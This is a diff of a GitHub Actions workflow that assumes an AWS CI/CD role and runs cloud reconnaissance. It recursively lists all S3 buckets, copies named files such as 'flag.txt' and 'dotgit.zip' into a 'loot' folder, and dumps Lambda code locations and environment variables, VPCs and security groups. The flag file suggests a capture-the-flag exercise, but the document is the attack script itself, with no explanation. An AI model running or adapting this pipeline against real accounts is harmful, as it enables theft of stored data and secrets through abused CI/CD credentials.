@@ -20,130 +20,87 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Verify AWS identity
+
+      - name: AWS identity
         run: |
           echo "===== AWS IDENTITY ====="
           aws sts get-caller-identity
 
 
-      - name: Check current IAM role
-        run: |
-          echo "===== IAM ROLE ====="
-
-          ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')
-
-          echo "Role: $ROLE"
-
-          aws iam get-role \
-            --role-name $ROLE || true
-
-
-      - name: Check IAM permissions
-        run: |
-          echo "===== ATTACHED ROLE POLICIES ====="
-
-          ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')
-
-          aws iam list-attached-role-policies \
-            --role-name $ROLE || true
-
-          echo "===== INLINE POLICIES ====="
-
-          aws iam list-role-policies \
-            --role-name $ROLE || true
-
-
-      - name: Enumerate S3
+      - name: S3 enumeration
         run: |
           echo "===== S3 BUCKETS ====="
-
           aws s3 ls
 
-          echo "===== BUCKET DETAILS ====="
+          echo "===== S3 OBJECTS ====="
 
           for bucket in $(aws s3 ls | awk '{print $3}')
           do
-            echo "### $bucket"
-
-            aws s3api get-bucket-location \
-              --bucket $bucket || true
-
-            aws s3api get-bucket-policy \
-              --bucket $bucket || true
-
-            aws s3 ls s3://$bucket || true
+            echo "### BUCKET: $bucket"
+            aws s3 ls s3://$bucket --recursive || true
           done
 
 
-      - name: Enumerate Lambda
+      - name: Download interesting S3 files
+        run: |
+          mkdir -p loot
+
+          echo "===== TRY DOWNLOADS ====="
+
+          aws s3 cp s3://codec4f26c862a321ef5/code.zip loot/code.zip || true
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt loot/flag.txt || true
+
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip loot/dotgit.zip || true
+
+          ls -la loot
+
+
+      - name: Lambda enumeration
         run: |
           echo "===== LAMBDA FUNCTIONS ====="
 
           aws lambda list-functions
 
 
-          echo "===== LAMBDA CONFIG ====="
-
+      - name: Lambda details
+        run: |
           for func in $(aws lambda list-functions \
             --query 'Functions[].FunctionName' \
             --output text)
           do
-            echo "### $func"
+            echo "===== FUNCTION: $func ====="
 
             aws lambda get-function-configuration \
               --function-name $func
 
-            echo "----- FUNCTION URL -----"
+            echo "===== CODE LOCATION ====="
 
             aws lambda get-function \
-              --function-name $func || true
-
+              --function-name $func \
+              --query 'Code.Location'
           done
 
 
-      - name: Check Lambda roles
+      - name: Lambda environment variables
         run: |
-          echo "===== LAMBDA IAM ROLES ====="
-
-          for role in $(aws lambda list-functions \
-          --query 'Functions[].Role' \
-          --output text)
-          do
-
-            echo "ROLE: $role"
-
-            ROLE_NAME=$(echo $role | awk -F/ '{print $NF}')
-
-            aws iam list-attached-role-policies \
-              --role-name $ROLE_NAME || true
-
-          done
-
-
-      - name: Check VPC information
-        run: |
-          echo "===== VPC ====="
-
-          aws ec2 describe-vpcs
-
-          echo "===== SECURITY GROUPS ====="
-
-          aws ec2 describe-security-groups
-
-
-      - name: Check Lambda environment variables
-        run: |
-          echo "===== LAMBDA ENVIRONMENT ====="
+          echo "===== ENVIRONMENT VARIABLES ====="
 
           for func in $(aws lambda list-functions \
             --query 'Functions[].FunctionName' \
             --output text)
           do
 
-            echo "### $func"
-
             aws lambda get-function-configuration \
               --function-name $func \
-              --query Environment
+              --query 'Environment'
 
           done
+
+
+      - name: VPC enumeration
+        run: |
+          echo "===== VPCS ====="
+          aws ec2 describe-vpcs
+
+          echo "===== SECURITY GROUPS ====="
+          aws ec2 describe-security-groups
